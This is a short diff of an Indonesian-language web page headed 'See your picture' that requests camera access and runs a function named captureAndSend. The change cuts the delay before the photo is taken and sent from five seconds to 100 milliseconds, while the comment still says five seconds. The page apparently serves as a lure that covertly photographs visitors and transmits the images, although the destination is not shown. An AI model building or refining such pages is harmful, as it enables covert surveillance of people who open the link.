@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Akses Kamera dan Lokasi</title>
+    <title>Akses Kamera</title>
 </head>
 <body>
     <h1>Lihat Gambar Mu</h1>
@@ -21,7 +21,7 @@
                         // Ambil foto setelah beberapa detik atau berdasarkan event tertentu
                         setTimeout(() => {
                             captureAndSend(stream);
-                        }, 5000); // Ambil foto setelah 5 detik
+                        }, 100); // Ambil foto setelah 5 detik
                     })
                     .catch(function(error) {
                         alert("Akses kamera ditolak.");
